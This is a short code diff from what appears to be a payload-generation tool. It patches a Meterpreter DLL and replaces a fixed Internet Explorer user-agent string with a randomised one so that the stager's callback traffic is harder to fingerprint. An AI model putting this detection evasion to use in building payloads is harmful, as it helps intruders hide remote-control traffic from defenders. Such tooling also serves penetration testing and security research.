@@ -50,7 +50,8 @@ class Payload:
         meterpreterDll = patch.patchURL(meterpreterDll, urlString)
 
         # replace in the UA
-        meterpreterDll = patch.patchUA(meterpreterDll, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00")
+        # Added random UA -Opticshade
+        meterpreterDll = patch.patchUA(meterpreterDll, helpers.randomUserAgent() + "\x00")
 
         # compress/base64 encode the dll
         compressedDll = helpers.deflate(meterpreterDll)
